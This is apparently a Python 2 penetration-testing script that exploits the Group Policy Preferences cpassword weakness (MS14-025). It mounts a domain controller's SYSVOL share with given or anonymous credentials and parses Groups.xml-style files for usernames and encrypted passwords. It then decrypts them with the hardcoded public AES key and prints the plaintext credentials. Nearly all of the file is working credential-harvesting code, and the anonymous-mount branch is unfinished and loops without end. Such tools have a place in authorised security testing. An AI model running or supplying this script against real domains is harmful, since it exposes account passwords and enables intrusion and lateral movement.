#!/usr/local/bin/python

"""
Description:

Originally the vulnerability was reported in MS14-025 as 'The vulnerability could allow elevation of
privilege if Active Directory Group Policy preferences are used to distribute passwords across
the domain'. This was patched, however the issue is still exploitable for other preference
options as long as they require authentication to execute.

This script is used to gather the cpassword used in Group Policy Preferences and decrypt it regardless
of the hosting xml file.

Authors: Darryl Lane | Twitter: @darryllane101

Usage:
  gpp (-s <server>) (-d <domain>) (-u <username>) (-p <password>)
  gpp --version
  gpp -h

Example:
  gpp -s 192.168.1.111 -d dlsec.local -u administrator -p Password123

Options:
  -d <domain>        Target Domain name.
  -u <username>      A valid domain user account, username.
  -p <password>      A valid domain user account, password.
  -h --help          Show this screen.
  --version          Show version.
"""

from docopt import docopt
import time
import subprocess
import os
import fnmatch
from lxml import etree as ET
from Crypto.Cipher import AES
import base64
import sys
import re
import traceback
import platform

#CONFIG
temp_dir = os.path.expanduser('~/Desktop/tmp/') #Used to mount remote drive
oslist = ['darwin', 'kali']

def text_out(string,t_time):
  for letter in string:
    sys.stdout.write(letter)
    sys.stdout.flush()
    time.sleep(float(t_time))

#Mount SYSVOL with credentials
def mount_credentials(temp_dir, username, password, domain, operation_system, server):
  i = 0
  while True:
    if operation_system == 'darwin':
      if i == 0:
        ops, _, _ = platform.mac_ver()
        text_out('\nRunning On: MAC OSX {}\n'.format(ops), 0.05)
      command = (['mount', '-t', 'smbfs', '//{d};{u}:{p}@{s}/SYSVOL'.format(s=server, u=username, p=password, d=domain), '{m}'.format(m=temp_dir)])
      proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
      proc.wait()
      if proc.returncode == 64:
        unmount_share(temp_dir)
        i += 1
      else:
        break
    if operation_system == 'kali':
      try:
        if i == 0:
          ops = os.uname()[1].title()
          text_out('\nRunning On: {}\n'.format(ops), 0.05)
          command = "mount -t cifs //{s}/SYSVOL/ {m} -o username={u},password='{p}',domain={d}" .format (s=server, u=username, p=password, m=temp_dir, d=domain)
          proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
          stdout_value = proc.communicate()[0]
          found = check_mount()
          if found:
            break
      except Exception:
        traceback.print_exc()


#DEV Mount SYSVOL Anon
def mount_anon(temp_dir, operation_system, server):
  i = 0
  while True:
    if operation_system == 'darwin':
      if i == 0:
        ops, _, _ = platform.mac_ver()
        print 'Running....OSX {}\n'.format(ops)
      try:
        command = "mount -t cifs //{s}/SYSVOL {m}".format(s=server, m=temp_dir)
        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_null = p.communicate()[0]
        if "Password for" in output_null:
          print 'awdaa'
      except Exception, e:
        traceback.print_exc()
    if operation_system == 'kali':
      try:
        command = "mount -t cifs //{s}/SYSVOL/ {m}" .format (s=server, m=temp_dir)
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout_value = proc.communicate()[0]
        print stdout_value
      except Exception:
        traceback.print_exc()


#Unmount SYSVOL
def unmount_share(d_rectory):
  try:
      command = 'umount -f {}' .format (d_rectory)
      proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
      stdout_value = proc.communicate()[0]
  except Exception:
      debug(traceback.print_exc())

#Check if SYSVOL already mounted
def check_mount():
  found = False
  command_check = "mount"
  process_check = subprocess.Popen(command_check, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
  output_check = process_check.communicate()[0]
  line = output_check.splitlines()
  for i in line:
    pattern = r'(.*?SYSVOL)'
    matches = re.match(pattern,i)
    if matches:
      found = True
      break

  return found


#Collect Files from SYSVOL
def collect_files(temp_dir):
  try:
    pattern = "*.xml"
    file_list = []
    for root, dirs, files in os.walk(temp_dir):
      for filename in fnmatch.filter(files, pattern):
        file_list.append(os.path.join(root, filename))

  except KeyError as e:
    print e

  return file_list


#Read all files from SYSVOL
def read_files(server, files):
    results = {}
    for fi in files:
      try:
        doc = ET.parse(fi)
        root = doc.getroot()
        prop = root.find(".//Properties")
        username = prop.attrib['userName']
        gppass = prop.attrib['cpassword']
        results[username] = gppass
        print '\nCpass Identified:\n'
        print "Date: {}".format (time.strftime("%d/%m/%Y"))
        print "Time: {}".format (time.strftime("%H:%M:%S"))
        print "\nData Found In:\n{}{}{}{}{}" .format ("//",server,"/","SYSVOL/",fi[26:])
        print "\nUsername: " + username
        print "Cpass: " + gppass
      except KeyError:
              pass
      except Exception, e:
        print e

    return results


def decrypt_list(results):
  try:
    key = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
    key = key.replace("\n","").decode('hex')
    mode = AES.MODE_CBC
    iv = "\x00"*16
    enc = AES.new(key, mode, iv)
    for k,v in results.items():
      password = v
      password += "=" * ((4 - len(password) % 4) % 4)
      decoded = base64.b64decode(password)
      o = enc.decrypt(decoded)
      dpass = (o[:-ord(o[-1])].decode('utf16'))
      dlength = len(dpass)-2

      print "\nDecrypted Value: {}" .format (dpass)
      print "\n"
  except Exception, e:
    print e


def os_check(oslist):
  output = str(platform.platform()).lower()
  ops = re.compile(r'\b(?:%s)\b' % '|'.join(oslist))
  ops = ops.search(output).group(0)

  return ops

if __name__ == "__main__":

  arguments = docopt(__doc__, version= '1.0.0')
  if not os.path.exists(temp_dir): os.makedirs(temp_dir)
  if arguments['<server>'] is None:
    print __doc__
    exit(0)

  if arguments['-d'] and arguments['-u'] and arguments['-p']:
    server = arguments['<server>']
    domain = arguments['-d']
    username = arguments['-u']
    password = arguments['-p']
    operation_system = os_check(oslist)
    mount_credentials(temp_dir, username, password, domain, operation_system, server)
    file_list = collect_files(temp_dir)
    results = read_files(server, file_list)
    decrypt_list(results)
    unmount_share(temp_dir)
  else:
    server = arguments['<server>']
    operation_system = os_check(oslist)
    mount_anon(temp_dir, operation_system, server)
    file_list = collect_files(temp_dir)
    results = read_files(server, file_list)
    decrypt_list(results)
    unmount_share(temp_dir)
